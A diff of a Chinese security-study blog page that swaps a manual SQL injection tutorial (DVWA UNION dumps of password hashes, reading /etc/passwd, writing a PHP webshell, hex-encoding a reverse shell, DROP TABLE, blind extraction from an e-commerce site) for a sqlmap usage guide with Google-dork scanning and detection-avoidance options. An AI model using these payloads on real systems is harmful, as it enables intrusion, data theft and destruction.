@@ -10,7 +10,7 @@
     
     
     
-    <title>SQL-注入 | 且随疾风前行</title>
+    <title>SQLmap注入 | 且随疾风前行</title>
     <link href="”http://148.70.147.195/index.html“" rel="”prefetch”">
 
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -160,19 +160,19 @@
         <i class="fa fa-home"></i>
         <a href="http://148.70.147.195/index.html">且随疾风前行</a>
         >
-        <span>SQL-注入</span>
+        <span>SQLmap注入</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/2019/03/19/SQL-注入/">SQL-注入</a>
+                <a href="/2019/06/10/SQLmap注入/">SQLmap注入</a>
             </h1>
         </div>
         <div class="tag-article">
             
             <span class="label label-gal">
-                <i class="fa fa-calendar"></i> 2019-03-19
+                <i class="fa fa-calendar"></i> 2019-06-10
             </span>
             
         </div>
@@ -182,11 +182,11 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/2019/03/19/SQL-注入/">SQL-注入</a>
+                    <a href="/2019/06/10/SQLmap注入/">SQLmap注入</a>
                 </h4>
             </div>
             <p>
-                <i class="fa fa-calendar"></i> 2019-03-19
+                <i class="fa fa-calendar"></i> 2019-06-10
             </p>
             <p>
                 
@@ -195,70 +195,73 @@
         </center>
     </div>
     <div class="content-article">
-        <h3 id="手动漏洞挖掘-sql注入"><a href="#手动漏洞挖掘-sql注入" class="headerlink" title="手动漏洞挖掘-sql注入"></a>手动漏洞挖掘-sql注入</h3><p>服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器</p>
-<hr>
-<h4 id="用户登录判断"><a href="#用户登录判断" class="headerlink" title="用户登录判断"></a>用户登录判断</h4><p>·SELECT<em>FROM users WHERE user= ‘uname ‘ AND password=’pass’<br>·SELECT</em>FROM users WHERE user=’name’ AND password=’’ OR ‘’=’’<br>·基于报错的检测方法<br>·  ‘  % （）<br>·基于布尔的检测方法<br>1 ‘ and  ‘1 ‘= ‘1       /       1 ‘ and  ‘1<br>1 ‘and ‘1 ‘= ‘2         /        1 ‘and ‘0<br>判断查询字段并搞清楚位置表列数<br> ‘order by 9–                   #按查询列号排序<br>·  select + 时刻字段数=查询字段数<br>· 联合查询（多条查询语句同时执行）<br>·  ‘union select 1.2–<br>· ·union all select database().2–<br>DB用户 ： user（）<br>DB版本 ;   version()<br>‘union select databnase() , substring_index(user(),”@”,1)#（把查询函数切分）<br>全局函数 ： @@datadir（当前数据库所在位置），@@hostname（主机名）,@@VERSION，@@VERSION_compile_os （操作系统版本）<br>当前库： database()<br>·ASCLL转字符：char()                  分隔<br>链接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())<br>计算哈希：md5()</p>
-<hr>
-<h4 id="Mysql-数据结构"><a href="#Mysql-数据结构" class="headerlink" title="Mysql 数据结构"></a>Mysql 数据结构</h4><p>·information_schema<br>·所有库所有表/统计每库中表的数量<br>union select table_name,table_schema,from information_schema.tables#（查所有表）<br>UNION select table schema.count() FROM information_Schema.tables group by table_schema#（查表名）</p>
-<hr>
-<h4 id="Dvwa库中的表名"><a href="#Dvwa库中的表名" class="headerlink" title="Dvwa库中的表名"></a>Dvwa库中的表名</h4><p>·union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’#(按表名查询)</p>
-<hr>
-<h4 id="查询user-password-列的内容"><a href="#查询user-password-列的内容" class="headerlink" title="查询user,password 列的内容"></a>查询user,password 列的内容</h4><p>·union select user,password from dvwa.users#<br>·union select user,password from users#<br>·union select null,CONCAT(user(),0x3a,password) from users#</p>
-<hr>
-<h4 id="破解MD5"><a href="#破解MD5" class="headerlink" title="破解MD5"></a>破解MD5</h4><p>username:passhas——–&gt;hashtest<br>john –format=raw-MD5 hashtest –shou<br>sqlmap -d “mysql://root:@192.168.177.129:3306/dvwa” -a</p>
-<hr>
-<h3 id="读写文件和下载数据库"><a href="#读写文件和下载数据库" class="headerlink" title="读写文件和下载数据库"></a>读写文件和下载数据库</h3><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>‘union select null,LOAD_file(‘/etc/passwd’)#</p>
-<hr>
-<h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><blockquote>
-<p>‘union select null,”&lt;?php passthtu  $_ GET[‘cmd’]);?&gt;”INTO DUMPFILE”/var/www/a.php<br>可能会出发过滤机制<br>用16进制编码<br>kali实操拷贝一个反弹shell<br>cp /usr/share/webshell/php/ →reverse-shell.php/b.php<br>vi b.php 把ip改成目标ip 对b.php编码<br>cat b.php | xxd &lt;–(16进制编码) -ps<br>（会以固定长度编译，换行符mysql无法理解）用| tr -d ‘\n’<br>复制下编码内容注入到语句中去（0x编码内容）<br>·Mysql账号<br>cat php-revers-shell.php|xxd -ps | tr -d ‘\n’(反弹shell)</p>
-</blockquote>
-<hr>
-<h4 id="保存下载数据库"><a href="#保存下载数据库" class="headerlink" title="保存下载数据库"></a>保存下载数据库</h4><p>union select null,(0x3a,password) from users INTO OUTFILE’/tmp/a.db’#(脱库到目标服务器的本地目录，在通过url下载)</p>
-<h4 id="一个思路：编写服务器代码"><a href="#一个思路：编写服务器代码" class="headerlink" title="一个思路：编写服务器代码"></a>一个思路：编写服务器代码</h4><p>举个例子：<br><img src="https://s2.ax1x.com/2019/03/19/AuGOAS.png" alt><br>（上传的webshell收到限制没什么用）<br>变换一个思路了解目标服务器结构等等，直接写一段代码执行命令<br>如上图可以创建一个表单添加一个用户<br>现在的加密破解难度极大，效率低，可以变通思路，直接更改数据库内容，或添加高权限管理员</p>
+        <h4 id="SQLMAP自动注入"><a href="#SQLMAP自动注入" class="headerlink" title="SQLMAP自动注入"></a>SQLMAP自动注入</h4><p> 1 Get方法<br>     ·sqlmap -u “<a href="http://192.168.253.129/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=password&amp;user-info-php-submit-button=View+Account+Details&quot;" target="_blank" rel="noopener">http://192.168.253.129/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=password&amp;user-info-php-submit-button=View+Account+Details&quot;</a> -p username -f<br> ·扫描URL列表文件<br>      ·<a href="http://1.1.1.1/vuln1.php？q=foobar" target="_blank" rel="noopener">http://1.1.1.1/vuln1.php？q=foobar</a><br>       <a href="http://1.1.1.1/vuln3/id/1" target="_blank" rel="noopener">http://1.1.1.1/vuln3/id/1</a>*<br>       -d “mysql://user:<a href="mailto:password@192.168.20.10" target="_blank" rel="noopener">password@192.168.20.10</a>:3306/dvwa” -f –users –banner –dbs –schema -a</p>
+<pre><code>·sqlmap -m list.txt
+扫描Google的搜索结果
+SQLmap.py -g &quot;inurl:\&quot;php?id=1\&quot;&quot;
+</code></pre><table>
+<thead>
+<tr>
+<th style="text-align:left">常用的一些参数</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">-a</td>
+<td style="text-align:left">all</td>
+</tr>
+<tr>
+<td style="text-align:left">–banner</td>
+<td style="text-align:left">目标是什么版本，什么信息的数据库</td>
+</tr>
+<tr>
+<td style="text-align:left">–dbs</td>
+<td style="text-align:left">所有数据库</td>
+</tr>
+<tr>
+<td style="text-align:left">-f</td>
+<td style="text-align:left">指纹，足迹</td>
+</tr>
+<tr>
+<td style="text-align:left">–force-ssl</td>
+<td style="text-align:left">实现对HTTPS的sql注入</td>
+</tr>
+<tr>
+<td style="text-align:left">-h/-hh</td>
+<td style="text-align:left">展示/详细展示帮助</td>
+</tr>
+<tr>
+<td style="text-align:left">-m list.txt</td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">-p</td>
+<td style="text-align:left">手动测是要测试的参数</td>
+</tr>
+<tr>
+<td style="text-align:left">–schema</td>
+<td style="text-align:left">源数据库(定义数据的数据)</td>
+</tr>
+<tr>
+<td style="text-align:left">–users</td>
+<td style="text-align:left">所有数据库用户</td>
+</tr>
+<tr>
+<td style="text-align:left">–version</td>
+<td style="text-align:left">版本信息</td>
+</tr>
+</tbody>
+</table>
+<p>2 POST方法<br>  ·使用http请求文件   sqlmap -r request.txt<br>  ·使用 burpsuit log文件 sqlmap -l log.txt<br> ·HTTPS</p>
 <blockquote>
-<p>ps 建议在kali装上professional的burp suite</p>
+<p>·sqlmap -u “<a href="https://127.0.0.1/a.php?id=1:8080&quot;--force-ssl" target="_blank" rel="noopener">https://127.0.0.1/a.php?id=1:8080&quot;--force-ssl</a></p>
 </blockquote>
-<p>当无权读取information_schema库 / 拒绝union、order by语句时</p>
-<ol>
-<li>猜列名： ‘ and column is mull#<br> ·Burpsuite 自动猜列名</li>
-<li>猜当前表表名： ‘and table.user is null#</li>
-<li>猜库里其他表名： ‘and (select*from table)&gt;0#</li>
-<li>列表对应关系：’and users.user is null#</li>
-<li>猜字段关系： ‘or user=’admin<pre><code>&apos;or user like &apos;%a%
-</code></pre></li>
-<li>猜账号对应密码：’or user=’admin’ and password=’密码<br>当数据可写</li>
-</ol>
-<blockquote>
-<p>· ‘:updat user set user=’yuanfh’ where user=’admin<br>“;”可以并列多条数据库语句<br>· INSERT INTO users（’user_id’,’first name’,’last_name’,’）user’,’password’,’avatar)VALUES(‘35’,’fh’,’yuan’,’密码’,’OK’);#<br>‘;DROP TABLE users；#<br>xp_cmdshell/ 储存过程<br>·SQLi没有通用的方法，要领就是掌握原理，了解各种数据库特性</p>
-</blockquote>
-<h5 id="sql注入-DVWAmedium难度级别和high难度区分"><a href="#sql注入-DVWAmedium难度级别和high难度区分" class="headerlink" title="sql注入-DVWAmedium难度级别和high难度区分"></a>sql注入-DVWAmedium难度级别和high难度区分</h5><p><img src="https://s2.ax1x.com/2019/03/20/AKngEj.png" alt><img src="https://s2.ax1x.com/2019/03/20/AKna4I.png" alt><br>上面两张图就是medium和low的区别<br>mysql_real_escape_string()”在php5.5弃用”在php7.0删除此语句，代之以MysqlLi，PDO_MySQl<br>medium在low的基础上增加了一句过滤语句，是PHP的集成语句，能实现特殊字符的转译</p>
-<blockquote>
-<p>“\,’,”,\n,\r,\xla”<br>下面看一下high改动的代码<br><img src="https://s2.ax1x.com/2019/03/20/AKuJzV.png" alt="在添加一行删除\的代码"><br><img src="https://s2.ax1x.com/2019/03/20/AKuDiR.png" alt="检查输入的是否为数字拒绝其他输入"><br>一个数字检查就无法注入select语句了</p>
-</blockquote>
-<hr>
-<h3 id="sql-盲注"><a href="#sql-盲注" class="headerlink" title="sql 盲注"></a>sql 盲注</h3><p>不显示数据库内建的报错信息<br>    ·内建的报错信息帮助开发人员发现和修复问题<br>    ·报错信息提供关于系统的大量有用信息<br>当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果即盲注</p>
-<p>思路：既然无法基于报错信息报错信息判断结果，基于逻辑真假的不同结果来判断<br>· 1’and 1=1#<br>· 1’and 1=2#<br>猜列名 ： 1’and table.user is not null#<br>猜库里其他表：1’and (select count() from table)&gt;0#<br>列对应关系 1’and users.user is not null#<br>猜字段内容：1’and user=’admin<br>           1’or user like ‘%a%<br>·猜账号对应密码：<br>         ·2’ or user=’admin’and password=’密码<br> ·burpsuit自动化猜解</p>
-<h4 id="·打开脑洞，注入的方式多种多样"><a href="#·打开脑洞，注入的方式多种多样" class="headerlink" title="·打开脑洞，注入的方式多种多样"></a>·打开脑洞，注入的方式多种多样</h4><p>真实案例：某电商网站</p>
-<blockquote>
-<p><a href="http://1.1.1.1/goods.php?cnt&amp;goodsid=123" target="_blank" rel="noopener">http://1.1.1.1/goods.php?cnt&amp;goodsid=123</a><br>·and 1=1#   显示一包面巾纸<br>·and 1=2#   显示一包洗衣粉<br>工具未扫到漏洞，于是人工拼接了下列语句<br>——————————————————————————————↓截取第一个字符<br>  · 1’and ORD(MID((version()),1,1))&amp;1&gt;0#<br> 得到ASCLL码↑<em>↑从字符串截取\</em>↑查询版本信息<br>· CURRENT_USER()、DATABASE()<br>· MID(ColumName,Start[,Length])<br>·ORD(string)&amp;32 跟上的对应的字符的ascll码的32所在的位的值<br>1(128) 1(64) 1(32) 1(16) 1(8) 1(4) 1(2) 1(1)<br>依次查询就可以的到对应的ascll码进而得到所有信息.</p>
-</blockquote>
-<h3 id="SQLMAP自动注入"><a href="#SQLMAP自动注入" class="headerlink" title="SQLMAP自动注入"></a>SQLMAP自动注入</h3><blockquote>
-<p>简介<br>    ·开源sql注入漏洞检测，利用工具<br>    ·检测动态页面中get/past参数、cookie、http头<br>    ·数据榨取<br>    ·文件系统访问<br>    ·操作系统命令执行<br>    ·引擎强大、特性丰富<br>    ·Xss漏洞检测</p>
-</blockquote>
-<blockquote>
-<p>五种漏洞检测技术</p>
-<ol>
-<li>基于布尔的盲注检测。(详见手动注入)</li>
-<li>基于时间的盲注检测。<br>· ‘and (select*from(select(sleep(20)))a)#<pre><code>↑等待20s再执行
-</code></pre></li>
-<li>基于错误的检测</li>
-<li>基于UNION的联合查询检测<br>  ·适用于通过for循环直接输出联合查询结果，否则只显示第一项结果</li>
-<li>基于堆叠的查询检测<br>·通过；堆叠多个查询语句<br>·适用于非slect的数据修改，删除操作<br>· 支持的数据库管理系统DBMS<br>·MySWQL，Oracle，PostgerSQL，Microft SQL，Server，Microsoft Access，IBM DB2，SQLite，Firebird，<br>Sybase，SAP MaxDB.</li>
-</ol>
-</blockquote>
-<blockquote>
-<p>其他特性<br> ·数据库直连  -d<br>         ·不通过SQL注入，指定身份认证信息，ip，端口<br> ·与Burp suit，Google 结合使用，支持政策表达式限定测试目标<br> ·Get，past，cookie，referer，User-Agent（随机或指定）<br>     ·cookie过期后自动处理Set-Cookie头，更新cookie信息<br> ·限速：最大开发 延迟发送<br> ·支持Basic，Digest，NTLM，CA身份认证<br> ·数据库版本，用户权限hash枚举和字典破解，暴力破解表列名称<br> ·文件上传下载，UDF，启动并执行储存过程，操作系统命令执行，访问windows注册表<br> ·与w3af，metaspolit集成结合使用，基于数据库服务进程提权和上传执行后门</p>
-</blockquote>
+<p>3 request 方法<br>·–user-agent<br> –random.agent<br>    ·sqlmap检查user-agent中的注入点: level &gt;=3<br>    ·APP/WAF/IPS/IDS/过滤异常user-agent时报错<br>3.1 提交请求<br>·Host 头<br> –host=”aaaaaaaaaa” –leval 5 –dbs<br> host 头的注入漏洞只会存在于level 5（一般不常见）<br> Refer 头：–refer<br> ·level &gt;=3<br>额外的header： –headers<br> · 多个头提交。每个头单独一行用”\”换行 (名称区分大小写)<br> · sqlmap -u “http：//1.1.1.1/a.php?id=1” –headers=”host：Www.a.com\nUser-Agent:yuanfh”<br> ·method=GET/PPOST<br> （不建议从高level检查”耗时且易发现”）<br> -methord=GET/POST<br>3.2 身份认证<br>类型：Basic   DIgest  NTLM<br>sqlmap -u “http<strong>**</strong>a.php?id=1”–auth-type <strong>Basic</strong> –auth-cred “user:pass”<br>基于证书的认证<br>–auth-cert（官方） / –auth-file (sqlmap -help)<br>–auth-file=”ca.PEM”<br>·含有私钥的PEM格式证书文件（仅支持）<br>·PEM格式认证</p>
+<p>·Http（s）代理<br>扫描时可能被服务器所发现，而被封。则可以用代理扫描<br>·–proxy=”http：//127.0.0.1:8087”<br>–proxy-cerd=”name:pass”<br>–ignor-proxy (忽略系统级代理设置，常用于扫描本地网络目标)<br>·sqlmap -u “http：//1.1.1.1/a.php?id=1”–proxy=”http：//127.0.0.1:8087”–dbs</p>
+<p>–delay<br>·（延迟设置，减小被发现的几率）每次http（S）请求之间延迟时间，浮点数，单位为妙，默认无延迟<br>–timeout<br>·请求超时时间，浮点数，默认为30秒<br>–retries<br>超时重试次数 ，默认三次<br>可以 参数 数值 or 参数=”数值“<br>–randomize<br> ·长度，类型与原始值保持一致的情况下，指定每次请求随机取值的参数名称</p>
+<p>–scope<br>     ·过滤日志内容，通过正测表达式筛选扫描对象<br>     ·sqlmap -l burp.log –sco=(www)?\target\.(com|net|org)”<br>     ·sqlmap -l 2.log –scope=”(19)?\.168\.20\.(1|10|100)”level 3 –dbs<br> –safe-url / –safe-freq<br>      ·检测和盲注阶段会产生大量失败请求，服务器段可能因此销毁session<br>      ·每发送–safe-freq次注入请求后发送一次正常请求<br> –skip-urlncode<br>     ·默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据<br> –eval<br>      每次请求 执行指定的python代码<br>      每次请求更改或者增加新的参数值（时间依赖，其他参数值依赖）<br>      sqlmap -u<br>      “http：//1.1.1.1/a.php?id=1&amp;hash=密文密码”–eval=“import hashlib;hash=hashlib.md5(id).hexdigest()”</p>
+<p> 4 OPTIMIAZATION<br> 优化性能<br>  –predict-output<br>       ·根据检方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率<br>       ·版本名，用户名，密码，Privilieges，role,数据库名称，表名，列名<br>       ·与threads参数不兼容<br>       ·统计表：/user/share/sqlmap/txt/common-outputs。txt<br>   –keep-alive<br>    ·使用http（s）长连接，性能好<br>    ·与proxy参数不兼容<br>    ·长连接避免你重复建立连接的网络开销，但大量长连接会占用服务器资源<br>   –null-connection<br>       · 只获取相应页面大小值而非页面具体内容<br>       ·通常只用于盲注判断（真假），降低网络带宽消耗<br>       ·与–text-only参数不兼容（基于页面内容比较判断 真/假）<br>   –threads<br>    ·最大并发线程<br>    ·盲注时每个线程获取一个字符（7次请求），获取完成后线程结束<br>    ·默认值为1，建议不要超过10 ，否则可能影响站点可用性<br>    ·与 –predict-output参数不兼容<br>   -o 开启前三个性能参数（除–threads参数）</p>
 
     </div>
 </article>
@@ -269,7 +272,7 @@
 <script>
 	if(!window.commentConfig) {
       window.commentConfig = {}
-      window.commentConfig.title = 'SQL-注入'
+      window.commentConfig.title = 'SQLmap注入'
     }
 </script>
 
@@ -327,61 +330,55 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2019/06/10/简单爬虫/">简单爬虫</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/10/SQLmap注入/">SQLmap注入</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/10/SQL手动注入初步/">SQL手动注入初步</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/10/安全入门5/">安全入门5</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/10/安全入门4/">安全入门4</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/10/安全入门3/">安全入门3</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/10/安全入门2/">安全入门2</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/10/安全入门/">安全入门</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2019/03/31/hexo博客在自己服务器上的搭建/">hexo博客在自己服务器上的搭建</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2019/03/24/新的开始-爬虫/">新的开始--爬虫基础</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2019/03/23/参数表/">参数表</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2019/03/23/sqlmap自动注入/">sqlmap自动注入</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2019/03/19/SQL-注入/">SQL-注入</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2019/03/19/web安全入门第五天/">web安全入门第五天</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2019/03/19/web安全入门第4天/">web安全入门第4天</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2019/03/19/web安全入门第三天/">web安全入门第三天</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2019/03/18/web安全入门第二天/">web安全入门第二天</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2019/03/18/web安全入门第一天/">web安全入门第一天</a>
                 </span>
             </li>
             
@@ -403,19 +400,13 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2019/03/17/hello-world/">Hello World</a>
+                    <a href="/2019/06/10/SQLmap注入/">SQLmap注入</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2019/03/23/sqlmap自动注入/">sqlmap自动注入</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2019/03/19/web安全入门第4天/">web安全入门第4天</a>
+                    <a href="/2019/06/10/SQL手动注入初步/">SQL手动注入初步</a>
                 </span>
             </li>
             
@@ -427,37 +418,37 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2019/03/18/web安全入门第一天/">web安全入门第一天</a>
+                    <a href="/2019/06/10/安全入门/">安全入门</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2019/03/18/web安全入门第二天/">web安全入门第二天</a>
+                    <a href="/2019/06/10/安全入门3/">安全入门3</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2019/03/19/web安全入门第五天/">web安全入门第五天</a>
+                    <a href="/2019/06/10/安全入门2/">安全入门2</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2019/03/19/web安全入门第三天/">web安全入门第三天</a>
+                    <a href="/2019/06/10/安全入门4/">安全入门4</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2019/03/19/SQL-注入/">SQL-注入</a>
+                    <a href="/2019/06/10/安全入门5/">安全入门5</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2019/03/24/新的开始-爬虫/">新的开始--爬虫基础</a>
+                    <a href="/2019/06/10/简单爬虫/">简单爬虫</a>
                 </span>
             </li>
             
@@ -472,17 +463,17 @@
 
                 
                 <li>
-                    <a href="/2019/03/19/SQL-注入/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                    <a href="/2019/06/10/SQLmap注入/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/2019/03/19/SQL-注入/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                    <a href="/2019/06/10/SQLmap注入/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/2019/03/19/SQL-注入/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2019/06/10/SQLmap注入/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
                 
             </ul>
@@ -602,7 +593,7 @@
 <script src="https://myau.moe/js/comment/gitment.browser.js"></script>
 <script>
     if(window.commentConfig) {
-      window.commentConfig.id = 'Tue Mar 19 2019 18:41:22 GMT+0800'
+      window.commentConfig.id = 'Mon Jun 10 2019 20:21:32 GMT+0800'
       window.commentConfig.owner = 'toorliuyinghui'
       window.commentConfig.repo = 'toorliuyinghui'
       window.commentConfig.client_id = '1fe6b70d988456916089'
@@ -610,7 +601,7 @@
       window.commentConfig.redirect_uri = ''
     } else {
       window.commentConfig = {
-      	id: 'Tue Mar 19 2019 18:41:22 GMT+0800',
+      	id: 'Mon Jun 10 2019 20:21:32 GMT+0800',
         owner: 'toorliuyinghui',
         repo: 'toorliuyinghui',
         client_id: '1fe6b70d988456916089',
